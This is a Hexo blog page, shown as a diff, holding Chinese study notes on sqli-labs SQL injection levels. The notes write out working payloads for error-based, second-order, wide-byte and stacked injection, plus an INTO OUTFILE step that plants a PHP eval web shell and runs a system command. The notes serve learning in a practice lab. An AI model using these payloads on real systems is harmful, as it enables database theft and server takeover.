+<p>但是此处又有一个细节，如果账户和密码不正确，将会不回显UA</p>
+<h4 id="闭合方式"><a href="#闭合方式" class="headerlink" title="闭合方式"></a>闭合方式</h4><p>对UA操作：</p>
+<p>1	无回显</p>
+<p>1’	报错</p>
+<p>1“	无回显</p>
+<p>1)无回显</p>
+<p>很明显，就是单引号闭合</p>
+<h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p>单引号闭合，利用报错注入，例子：</p>
+<p>（经过多次尝试，格式严格等于）</p>
+<p><code>1&#39;=&#39;1&#39; and updatexml(1,concat(0x7e,database()),1)  and &#39;1&#39;=&#39;1</code> </p>
+<p>剩下照旧</p>
+<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>tip：经过多次抓包，发现每次都会发送两个包，一个GET，一个POST。本次是cookie注入，有关的是GET包</p>
+<p>还能咋样嘞，学习Less-18</p>
+<h3 id="小结-包注入"><a href="#小结-包注入" class="headerlink" title="小结(包注入)"></a>小结(包注入)</h3><p>简单的很，猜结构（其实不简单，但是我可以看source）</p>
+<p>information_schema,normal </p>
+<h3 id="Less-24"><a href="#Less-24" class="headerlink" title="Less-24"></a>Less-24</h3><p>二次注入</p>
+<p>查看登录页source，发现两个参数都经过mysql_real_escape_string()函数过滤，那么就不能进行正常注入。</p>
+<p>创建账户成功后，发现可以改密码。我们想夺取admin。</p>
+<p>创建用户名：admin’#，在修改密码时会执行该用户名，然后admin密码就被修改了。</p>
+<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>必须要单引号留存，特定函数(如addslashes())会给单引号前面加一个反斜杠使单引号不能发挥作用。</p>
+<p>爆库：</p>
+<p>?id&#x3D;%df ‘ union select 1,database(),3 –+ </p>
+<p>剩下如旧</p>
+<p>原理</p>
+<p>%df ‘ &#x3D;&gt; %df&#x2F; ‘  &#x3D;&gt; %df%5C%27，由于GBK会把%df%5C一起解码，所以%27成功变回单引号，实现逃逸。</p>
+<h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><p>堆叠注入</p>
+<p>发现本题只能回显第一条语句，不能回显第二条语句。那只有把第二条语句的结果注入到第一条语句。</p>
+<p>爆库：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(schema_name) from information_schema.schemata),1,20)) where username&#x3D;’Dumb’; –+ </p>
+<p>爆表：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’),1,20)) where username&#x3D;’Dumb’; –+ </p>
+<p>爆列：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’),1,20)) where username&#x3D;’Dumb’; –+ </p>
+<p>爆值：?id&#x3D;1’;update users set password&#x3D;(mid((select group_concat(id,password) from users),1,20)) where username&#x3D;’Dumb’; –+ </p>
+<h2 id="SQL注入进阶学习"><a href="#SQL注入进阶学习" class="headerlink" title="SQL注入进阶学习"></a>SQL注入进阶学习</h2><h3 id="注入木马"><a href="#注入木马" class="headerlink" title="注入木马"></a>注入木马</h3><p>第一步<br><code>id=-1 union select 1,&quot;&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;&quot;,3 into OUTFILE &#39;/var/www/html/name.php&#39; --+</code> </p>
+<p>第二步<br>url&#x2F;name.php<br>POST:<br>cmd&#x3D;system(“cat &#x2F;flag”);</p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="./photo/8.png"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2024/03/18/PHP/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">PHP</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+      <div class="card-cover" background-image-lazy data-img="./photo/13.jpg"></div>
+    
+    <div class="card-text">
+      
+        <a href="/2024/03/18/MYSQL%E5%9F%BA%E7%A1%80/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">MYSQL基础</h2>
+        </a>
+      
+      <div class="card-text--row">Older</div>
+    </div>
+  </article>
+</div>
+          
+        </nav>
+      
+
+      <section class="page-message-container layout-padding">
+        
+
+
+  
+  
+
+  
+  
+
+
+      </section>
+    </div>
+    <div class="widget-info">
+      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-body">
+    
+      <img src="/photo.jpg" class="soft-size--round soft-style--box" alt="Pax">
+    
+    
+      <h2>Pax</h2>
+    
+    
+      <p>蒹葭苍苍，白露为霜</p>
+    
+
+    <div class="count-box">
+      <div class="count-box--item">
+        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
+</svg>
+        <span>16</span>
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+        0
+      </div>
+      <div class="count-box--item">
+        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+        1
+      </div>
+    </div>
+  </div>
+</section>
+
+      
+<section class="widget-toc widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-toc" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M134.50666666 767.46666668H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.23999999v50.13333333c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H134.50666666c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.13333333c0.10666668-27.73333333 22.50666668-50.24000001 50.24000001-50.24000001zM84.37333332 541.65333333h326.18666669c27.73333333 0 50.24000001 22.39999999 50.23999999 50.13333334v50.24000001c0 27.73333333-22.50666668 50.24000001-50.24000002 50.23999999H84.37333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.23999999v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333334zM134.50666666 315.83999999H460.8c27.73333333 0 50.24000001 22.50666668 50.24000001 50.24000001v50.24000001c0 27.73333333-22.50666668 50.13333334-50.24000001 50.13333333H134.50666666c-27.73333333 0-50.24000001-22.39999999-50.23999999-50.13333333v-50.24000001c0.10666668-27.84000001 22.50666668-50.24000001 50.24000001-50.23999999zM209.81333332 89.91999999h326.18666671c27.73333333 0 50.24000001 22.39999999 50.23999997 50.13333335v50.23999999c0 27.73333333-22.50666668 50.24000001-50.24000001 50.24000001H209.81333332c-27.73333333 0-50.24000001-22.50666668-50.23999999-50.24000001v-50.24000001c0-27.73333333 22.50666668-50.13333334 50.24000001-50.13333333zM692.05333333 623.36l274.66666669 176.00000002c23.36000001 14.93333333 30.08 45.97333334 15.14666666 69.33333332L954.77333334 910.93333333c-14.93333333 23.25333334-45.97333334 30.08-69.33333335 15.14666667l-274.66666666-176c-23.36000001-14.93333333-30.08-45.97333334-15.14666667-69.33333333l27.09333334-42.24000001c14.93333333-23.36000001 46.08000001-30.08 69.33333333-15.14666666z" fill="currentColor"></path>
+</svg>
+    <span>TOC</span>
+  </div>
+  <div class="widget-body">
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#select%E8%BF%87%E6%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">select过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="toc-number">3.</span> <span class="toc-text">基础概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.</span> <span class="toc-text">宽字节注入的条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E6%AD%A5%E9%AA%A4%E8%AF%A6%E8%A7%A3"><span class="toc-number">5.</span> <span class="toc-text">布尔盲注步骤详解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">实战</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8python%E8%84%9A%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">布尔盲注python脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">联合注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">报错注入：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">10.</span> <span class="toc-text">布尔盲注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9A"><span class="toc-number">11.</span> <span class="toc-text">时间盲注：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">12.</span> <span class="toc-text">测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F"><span class="toc-number">13.</span> <span class="toc-text">闭合方式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E6%95%B0%E6%8D%AE"><span class="toc-number">14.</span> <span class="toc-text">爆数据</span></a></li></ol>
+  </div>
+</section>
+
+
+      
+<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
+</svg>
+    <span>NOTICE</span>
+  </div>
+  <div class="widget-body">
+    <p>还在操作ing</p>
+  </div>
+</section>
+
+
+      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
+</svg>
+    <span>CATEGORYS</span>
+  </div>
+  <div class="widget-body">
+    <ul class="categorys-list">
+      
+    </ul>
+  </div>
+</section>
+
+      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
+  <div class="widget-title">
+    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
+</svg>
+    <span>TAGS</span>
+  </div>
+  <div class="widget-body">
+    <div class="tags-cloud">
+      <a href="/tags/%E5%85%A5%E9%97%A8/" style="font-size: 10px;" class="tags-cloud-0">入门</a>
+    </div>
+  </div>
+</section>
+    </div>
+  </article>
+</div>
+
+    <!-- footer container -->
+<footer id="footer" class="footer">
+  <div class="footer-container">
+    
+    <div class="social-icons">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M64.6 512c0 195.6 125.4 361.9 300.1 422.9 23.5 5.9 19.9-10.8 19.9-22.2v-77.6c-135.8 15.9-141.3-74-150.5-89-18.5-31.5-61.9-39.5-49-54.5 31-15.9 62.5 4 98.9 58 26.4 39.1 77.9 32.5 104.1 26 5.7-23.5 17.9-44.5 34.7-60.9-140.7-25.2-199.4-111.1-199.4-213.3 0-49.5 16.4-95.1 48.4-131.8-20.4-60.6 1.9-112.4 4.9-120.1 58.2-5.2 118.5 41.6 123.3 45.3 33.1-8.9 70.8-13.7 112.9-13.7 42.4 0 80.3 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.4-43.9 2.9 7.7 24.7 58.3 5.5 118.1 32.5 36.8 49 82.8 49 132.4 0 102.3-59 188.3-200.2 213.2 23.5 23.3 38.1 55.5 38.1 91.1v112.7c0.8 9 0 17.9 15.1 17.9C832.7 877 960.4 709.4 960.4 512.1c0-247.5-200.6-447.9-447.9-447.9C265 64.1 64.6 264.5 64.6 512z"></path>
+</svg>
+          </a>
+        
+      
+        
+          <a href="https://twitter.com/guanquanhong" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
+            <svg class="icon icon-twitter" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path d="M962.285714 233.142857q-38.285714 56-92.571429 95.428571 0.571429 8 0.571429 24 0 74.285714-21.714286 148.285714t-66 142-105.428571 120.285714-147.428571 83.428571-184.571429 31.142857q-154.857143 0-283.428571-82.857143 20 2.285714 44.571429 2.285714 128.571429 0 229.142857-78.857143-60-1.142857-107.428571-36.857143t-65.142857-91.142857q18.857143 2.857143 34.857143 2.857143 24.571429 0 48.571429-6.285714-64-13.142857-106-63.714286t-42-117.428571l0-2.285714q38.857143 21.714286 83.428571 23.428571-37.714286-25.142857-60-65.714286t-22.285714-88q0-50.285714 25.142857-93.142857 69.142857 85.142857 168.285714 136.285714t212.285714 56.857143q-4.571429-21.714286-4.571429-42.285714 0-76.571429 54-130.571429t130.571429-54q80 0 134.857143 58.285714 62.285714-12 117.142857-44.571429-21.142857 65.714286-81.142857 101.714286 53.142857-5.714286 106.285714-28.571429z"></path>
+</svg>
+          </a>
+        
+      
+    </div>
+     
+    <p>&copy; 2024 <a href="/" target="_blank">pax</a></p>
+
+    
+
+    <p>Powered by <a href="https://hexo.io" target="_blank" rel="noopener noreferrer">Hexo</a> Theme - <a href="https://github.com/miiiku/flex-block" target="_blank" rel="noopener noreferrer author">flex-block</a></p>
+
+    <p>
+      <a href="javascript:;" id="theme-light">🌞 浅色</a>
+      <a href="javascript:;" id="theme-dark">🌛 深色</a>
+      <a href="javascript:;" id="theme-auto">🤖️ 自动</a>
+    </p>
+  </div>
+</footer>
+  </div>
+
+  <div class="back-to-top-fixed soft-size--round soft-style--box">
+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+<!-- copy button  -->
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script>
+
+<!-- https://clipboardjs.com/ -->
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+</body>
+</html>
